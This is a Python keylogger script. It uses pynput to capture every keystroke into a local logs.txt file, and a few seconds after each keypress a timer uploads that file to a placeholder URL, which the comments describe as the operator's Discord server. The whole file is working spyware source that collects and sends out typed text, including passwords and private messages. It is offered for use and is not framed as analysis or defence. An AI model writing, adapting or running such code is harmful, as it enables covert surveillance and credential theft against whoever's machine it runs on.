from pynput.keyboard import Listener, Key
import os
import requests
import threading

LOGS_GUY = 'URL'  # Replace with your actual URL
# Ensure the log file is created at the start
log_path = os.path.join(os.path.dirname(__file__), "logs.txt") #you can change name 

# Initialize log file
if os.path.exists(log_path):
    open(log_path, "w").close()

send_timer = None
send_interval = 3 # How many seconds of delay (or gap) do you need for sending the logs to your Discord server
word_buffer = ""  # Buffer to gather text

def send_logs():
    global send_timer
    if os.path.exists(log_path):
        try:
            with open(log_path, "rb") as file:
                response = requests.post(LOGS_GUY, files={"file": ("logs.txt", file)})
                response.raise_for_status()  # Check for HTTP errors
            if response.status_code == 204:
                print("File sent successfully!")
            else:
                print(f"Failed to send file. Status: {response.status_code}, Content: {response.text}")
        except requests.exceptions.ConnectionError as e:
            print(f"Connection error: {e}")
        except requests.exceptions.HTTPError as e:
            print(f"HTTP error occurred: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

def timer():
    global send_timer
    if send_timer is not None:
        send_timer.cancel()  # Cancel the existing timer
    send_timer = threading.Timer(send_interval, send_logs)  # Send logs after the interval
    send_timer.start()

def wif(stroke):
    """Handle each keypress and log it."""
    global word_buffer
    try:
        with open(log_path, "a") as log_file:
            
            if isinstance(stroke, Key):  # Handle special keys
                log_file.write(f"{str(stroke)}\n")  # Log special keys directly
            if stroke == Key.space:
                word_buffer += ' '  # Add a space to the buffer
                log_file.write(" ")
                log_file.write(str(stroke) + '\n')  # Log space directly
            elif stroke == Key.enter:
                log_file.write(word_buffer + "\n")  # Log the complete buffer followed by a newline
                word_buffer = ""  # Reset buffer after writing
            elif stroke == Key.backspace:
                log_file.write(str(stroke) + '\n')  # Log backspace action, can remove if not needed
            else:
                # Append other keys to the buffer
                char = str(stroke).replace("'", "")  # Clean up the string
                if len(char) == 1:  # Only add actual characters
                    word_buffer += char  # Add to buffer
                    log_file.write(char)  # Log the character

        timer()  # Reset the timer after every keypress
    except Exception as e:
        print(f"ERROR: {e}")

# Start the listener
with Listener(on_press=wif) as listener:
    listener.join()
